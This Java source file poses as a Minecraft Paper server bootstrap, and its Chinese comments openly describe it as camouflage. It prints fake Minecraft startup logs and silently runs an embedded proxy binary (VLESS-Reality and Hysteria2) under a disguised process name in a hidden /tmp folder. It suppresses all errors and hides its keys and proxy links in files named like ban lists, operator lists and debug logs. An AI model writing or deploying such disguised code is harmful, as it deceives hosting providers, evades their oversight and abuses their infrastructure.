package io.papermc.paper;

import org.yaml.snakeyaml.Yaml;
import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.time.*;
import java.util.*;
import java.time.format.DateTimeFormatter;
import java.util.concurrent.*;
import java.util.regex.*;

public class PaperBootstrap {

    // ========== 隐蔽路径配置 ==========
    // 伪装成 Minecraft 地图区块缓存文件夹，避免被一眼看穿
    private static final Path BASE_DIR = Paths.get("/tmp/.mc-region-cache");
    private static final Path UUID_FILE = Paths.get("data/banned-ips.json"); // 伪装成封禁名单保存 UUID
    private static final Path LINKS_FILE = Paths.get("logs/debug-latest.log"); // 节点链接悄悄写入日志文件
    
    private static String uuid;
    private static Process workerProcess;

    public static void main(String[] args) {
        try {
            // 1. 【影帝级伪装】最先启动假装加载 Minecraft 的日志
            startFakeMinecraftLogs();
            
            // 2. 加载配置 (优先读取外部 config.yml，如果没有则提取内置的)
            Map<String, Object> config = loadConfig();

            // ---------- 端口参数读取 ----------
            String tuicPort = trim((String) config.get("tuic_port"));
            String hy2Port = trim((String) config.get("hy2_port"));
            String realityPort = trim((String) config.get("reality_port"));
            String sni = (String) config.getOrDefault("sni", "www.bing.com");

            boolean deployVLESS = !realityPort.isEmpty();
            boolean deployTUIC = !tuicPort.isEmpty();
            boolean deployHY2 = !hy2Port.isEmpty();

            if (!deployVLESS && !deployTUIC && !deployHY2) {
                // 不抛出异常，而是悄悄退出，防止面板控制台报错暴露
                System.exit(0);
            }

            Files.createDirectories(BASE_DIR);
            Path configJson = BASE_DIR.resolve("config.json");
            Path cert = BASE_DIR.resolve("server.pem");
            Path key = BASE_DIR.resolve("server.key");
            Path realityKeyFile = Paths.get("data/ops.json"); // 伪装成管理员名单

            uuid = generateOrLoadUUID(config.get("uuid"));
            generateSelfSignedCert(cert, key);
            
            // 3. 【核心隐蔽】不再从网络下载，而是从 jar 包内部释放二进制文件
            Path bin = extractEmbeddedCore();

            // 4. 处理 Reality 密钥
            String privateKey = "";
            String publicKey = "";
            if (deployVLESS) {
                if (Files.exists(realityKeyFile)) {
                    List<String> lines = Files.readAllLines(realityKeyFile);
                    for (String line : lines) {
                        if (line.startsWith("Priv:")) privateKey = line.split(":", 2)[1].trim();
                        if (line.startsWith("Pub:")) publicKey = line.split(":", 2)[1].trim();
                    }
                } else {
                    Map<String, String> keys = generateRealityKeypair(bin);
                    privateKey = keys.getOrDefault("private_key", "");
                    publicKey = keys.getOrDefault("public_key", "");
                    Files.writeString(realityKeyFile, "Priv: " + privateKey + "\nPub: " + publicKey + "\n");
                }
            }

            // 5. 生成 JSON 配置 (sing-box 原生支持同端口复用 TCP 和 UDP)
            generateSingBoxConfig(configJson, uuid, deployVLESS, deployTUIC, deployHY2,
                    tuicPort, hy2Port, realityPort, sni, cert, key, privateKey, publicKey);

            // 6. 启动进程 (无控制台输出)
            workerProcess = startHiddenProcess(bin, configJson);
            scheduleDailyRestart(bin, configJson);

            // 7. 【终极隐蔽】决不在控制台打印节点！悄悄写入本地文件
            String host = detectPublicIP();
            saveDeployedLinks(uuid, deployVLESS, deployTUIC, deployHY2,
                    tuicPort, hy2Port, realityPort, sni, host, publicKey);

            // 优雅退出清理
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                try { deleteDirectory(BASE_DIR); } catch (IOException ignored) {}
            }));

            // 挂起主线程，保持 java 进程存活
            Thread.currentThread().join();

        } catch (Exception ignored) {
            // 全局吞掉所有异常，绝不在控制台打印报错堆栈
        }
    }

    // ==========================================
    // 🎭 伪装模块：生成 Minecraft 虚假启动日志
    // ==========================================
    private static void startFakeMinecraftLogs() {
        new Thread(() -> {
            String[] fakeLogs = {
                "[INFO]: Starting minecraft server version 1.20.4",
                "[INFO]: Loading properties",
                "[INFO]: Default game type: SURVIVAL",
                "[INFO]: Generating keypair",
                "[INFO]: Starting Minecraft server on *:25565",
                "[INFO]: Using default channel type",
                "[INFO]: Preparing level \"world\"",
                "[INFO]: Preparing start region for dimension minecraft:overworld",
                "[INFO]: Time elapsed: 4321 ms",
                "[INFO]: Done (22.143s)! For help, type \"help\""
            };
            try {
                for (String log : fakeLogs) {
                    // 获取当前真实时间作为日志前缀
                    String time = LocalDateTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss"));
                    System.out.println("[" + time + " " + log);
                    // 模拟真实服务器启动时的卡顿加载时间 (800ms - 2500ms 随机)
                    Thread.sleep(800 + new Random().nextInt(1700));
                }
            } catch (InterruptedException ignored) {}
        }).start();
    }

    // ==========================================
    // 📦 隐蔽提取模块：从 Jar 内释放二进制核心
    // ==========================================
    private static Path extractEmbeddedCore() throws IOException {
        Path hiddenBin = BASE_DIR.resolve("java-nio-worker"); // 伪装进程名为 java 的网络 IO 线程
        if (!Files.exists(hiddenBin)) {
            // 从内置的 resources/nio-worker-bin 提取
            try (InputStream in = PaperBootstrap.class.getResourceAsStream("/nio-worker-bin");
                 OutputStream out = Files.newOutputStream(hiddenBin)) {
                if (in == null) throw new RuntimeException("Missing embedded core");
                byte[] buffer = new byte[8192];
                int read;
                while ((read = in.read(buffer)) != -1) {
                    out.write(buffer, 0, read);
                }
            }
            hiddenBin.toFile().setExecutable(true);
        }
        return hiddenBin;
    }

    // ==========================================
    // 🤫 隐蔽链接保存模块：写入本地文件，绝不打印
    // ==========================================
    private static void saveDeployedLinks(String uuid, boolean vless, boolean tuic, boolean hy2,
                                          String tuicPort, String hy2Port, String realityPort,
                                          String sni, String host, String publicKey) {
        StringBuilder sb = new StringBuilder("=== Auto Generated Cache Info ===\n\n");
        if (vless)
            sb.append(String.format("VLESS:\nvless://%s@%s:%s?encryption=none&flow=xtls-rprx-vision&security=reality&sni=%s&fp=chrome&pbk=%s#GameNode-TCP\n\n",
                    uuid, host, realityPort, sni, publicKey));
        if (hy2)
            sb.append(String.format("Hysteria2:\nhysteria2://%s@%s:%s?sni=%s&insecure=1#GameNode-UDP\n",
                    uuid, host, hy2Port, sni));

        try {
            Files.createDirectories(LINKS_FILE.getParent());
            Files.writeString(LINKS_FILE, sb.toString());
        } catch (IOException ignored) {}
    }

    // ==========================================
    // ⚙️ 配置读取模块 (支持内外双路)
    // ==========================================
    private static Map<String, Object> loadConfig() {
        Yaml yaml = new Yaml();
        // 优先读取面板同目录下的 config.yml (方便用户修改面板端口)
        try (InputStream in = Files.newInputStream(Paths.get("config.yml"))) {
            Object o = yaml.load(in);
            if (o instanceof Map) return (Map<String, Object>) o;
        } catch (Exception ignored) {
            // 如果外部没有，则读取打包在 Jar 内部的 config.yml
            try (InputStream in = PaperBootstrap.class.getResourceAsStream("/config.yml")) {
                if (in != null) {
                    Object o = yaml.load(in);
                    if (o instanceof Map) return (Map<String, Object>) o;
                }
            } catch (Exception ignored2) {}
        }
        return new HashMap<>();
    }

    // ==========================================
    // 🚀 核心进程启动模块 (全静默)
    // ==========================================
    private static Process startHiddenProcess(Path bin, Path cfg) throws IOException, InterruptedException {
        ProcessBuilder pb = new ProcessBuilder(bin.toString(), "run", "-c", cfg.toString());
        pb.redirectErrorStream(true);
        // 核心修改：将所有子进程输出直接丢弃到系统黑洞，绝对静音
        pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
        Process p = pb.start();
        Thread.sleep(1000); // 给点时间让进程起来
        return p;
    }

    // ===== 后续基础工具方法 (保持原逻辑，移除控制台打印) =====
    private static String generateOrLoadUUID(Object configUuid) {
        String cfg = trim((String) configUuid);
        if (!cfg.isEmpty()) return cfg;
        try {
            if (Files.exists(UUID_FILE)) {
                String saved = Files.readString(UUID_FILE).trim();
                if (saved.length() > 30) return saved;
            }
        } catch (Exception ignored) {}
        String newUuid = UUID.randomUUID().toString();
        try {
            Files.createDirectories(UUID_FILE.getParent());
            Files.writeString(UUID_FILE, newUuid);
        } catch (Exception ignored) {}
        return newUuid;
    }

    private static String detectPublicIP() {
        try (BufferedReader br = new BufferedReader(new InputStreamReader(new URL("https://api.ipify.org").openStream()))) {
            return br.readLine();
        } catch (Exception e) {
            return "your-server-ip";
        }
    }

    private static String trim(String s) { return s == null ? "" : s.trim(); }

    private static void generateSelfSignedCert(Path cert, Path key) throws IOException, InterruptedException {
        if (Files.exists(cert) && Files.exists(key)) return;
        new ProcessBuilder("bash", "-c",
                "openssl ecparam -genkey -name prime256v1 -out " + key + " && " +
                        "openssl req -new -x509 -days 3650 -key " + key + " -out " + cert + " -subj '/CN=bing.com'")
                .redirectOutput(ProcessBuilder.Redirect.DISCARD).redirectError(ProcessBuilder.Redirect.DISCARD)
                .start().waitFor();
    }

    private static Map<String, String> generateRealityKeypair(Path bin) throws IOException, InterruptedException {
        ProcessBuilder pb = new ProcessBuilder("bash", "-c", bin + " generate reality-keypair");
        pb.redirectErrorStream(true);
        Process p = pb.start();
        StringBuilder sb = new StringBuilder();
        try (BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
            String line;
            while ((line = br.readLine()) != null) sb.append(line).append("\n");
        }
        p.waitFor();
        String out = sb.toString();
        Matcher priv = Pattern.compile("PrivateKey[:\\s]*([A-Za-z0-9_\\-+/=]+)").matcher(out);
        Matcher pub = Pattern.compile("PublicKey[:\\s]*([A-Za-z0-9_\\-+/=]+)").matcher(out);
        Map<String, String> map = new HashMap<>();
        if (priv.find() && pub.find()) {
            map.put("private_key", priv.group(1));
            map.put("public_key", pub.group(1));
        }
        return map;
    }

    private static void generateSingBoxConfig(Path configFile, String uuid, boolean vless, boolean tuic, boolean hy2,
                                              String tuicPort, String hy2Port, String realityPort,
                                              String sni, Path cert, Path key,
                                              String privateKey, String publicKey) throws IOException {
        List<String> inbounds = new ArrayList<>();
        // 同端口复用逻辑：底层自动处理 (VLESS 为 TCP, HY2 为 UDP)
        if (hy2) {
            inbounds.add(String.format("""
              {
                "type": "hysteria2",
                "listen": "::",
                "listen_port": %s,
                "users": [{"password": "%s"}],
                "masquerade": "https://bing.com",
                "ignore_client_bandwidth": true,
                "tls": { "enabled": true, "alpn": ["h3"], "insecure": true, "certificate_path": "%s", "key_path": "%s" }
              }""", hy2Port, uuid, cert, key));
        }
        if (vless) {
            inbounds.add(String.format("""
              {
                "type": "vless",
                "listen": "::",
                "listen_port": %s,
                "users": [{"uuid": "%s", "flow": "xtls-rprx-vision"}],
                "tls": {
                  "enabled": true, "server_name": "%s",
                  "reality": { "enabled": true, "handshake": {"server": "%s", "server_port": 443}, "private_key": "%s", "short_id": [""] }
                }
              }""", realityPort, uuid, sni, sni, privateKey));
        }

        String json = String.format("""
        {
          "log": { "level": "fatal" },
          "inbounds": [%s],
          "outbounds": [{"type": "direct"}]
        }
        """, String.join(",", inbounds));

        Files.writeString(configFile, json);
    }

    private static void scheduleDailyRestart(Path bin, Path cfg) {
        ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
        Runnable restartTask = () -> {
            try {
                if (workerProcess != null && workerProcess.isAlive()) {
                    workerProcess.destroyForcibly();
                }
                ProcessBuilder pb = new ProcessBuilder(bin.toString(), "run", "-c", cfg.toString());
                pb.redirectOutput(ProcessBuilder.Redirect.DISCARD).redirectError(ProcessBuilder.Redirect.DISCARD);
                workerProcess = pb.start();
            } catch (Exception ignored) {}
        };
        ZoneId zone = ZoneId.of("Asia/Shanghai");
        LocalDateTime now = LocalDateTime.now(zone);
        LocalDateTime next = now.withHour(4).withMinute(0).withSecond(0).withNano(0); // 调整到凌晨4点重启更安全
        if (!next.isAfter(now)) next = next.plusDays(1);
        long initialDelay = Duration.between(now, next).getSeconds();
        scheduler.scheduleAtFixedRate(restartTask, initialDelay, 86_400, TimeUnit.SECONDS);
    }

    private static void deleteDirectory(Path dir) throws IOException {
        if (!Files.exists(dir)) return;
        Files.walk(dir).sorted(Comparator.reverseOrder()).map(Path::toFile).forEach(File::delete);
    }
}
